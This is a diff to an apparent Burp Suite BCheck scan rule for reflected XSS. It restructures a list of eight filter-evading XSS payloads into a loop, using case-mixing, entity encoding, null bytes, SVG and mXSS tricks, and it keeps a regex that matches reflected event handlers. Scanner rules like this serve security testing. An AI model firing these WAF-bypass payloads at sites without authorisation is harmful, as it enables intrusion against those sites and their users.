@@ -5,20 +5,21 @@ metadata:
     author: "BCheck Arsenal"
     tags: "xss", "reflected", "waf-bypass"
 
+run for each:
+    payload = "<sVg/oNlOaD=alert(document.domain)>",
+        "<iMg sRc=x oNeRrOr=&#97;&#108;&#101;&#114;&#116;(1)>",
+        "<dEtAiLs/oPeN/oNtOgGlE=alert(1)>",
+        "<a hReF=jAvAsCrIpT:alert(1)>click</a>",
+        "<bOdY%00 oNlOaD=alert(1)>",
+        "<img src=x onerror=alert`1`>",
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "<sVg/oNlOaD=alert(document.domain)>"
-            - "<iMg sRc=x oNeRrOr=&#97;&#108;&#101;&#114;&#116;(1)>"
-            - "<dEtAiLs/oPeN/oNtOgGlE=alert(1)>"
-            - "<a hReF=jAvAsCrIpT:alert(1)>click</a>"
-            - "<bOdY%00 oNlOaD=alert(1)>"
-            - "<img src=x onerror=alert`1`>"
-            - "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
-            - "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
+        replacing: {payload}
 
-    if {check.response} matches "(alert\(|alert`|onerror|onload|ontoggle|onbegin|javascript:)" then
+    if {latest.response} matches "(alert\(|alert`|onerror|onload|ontoggle|onbegin|javascript:)" then
         report issue:
             severity: high
             confidence: firm
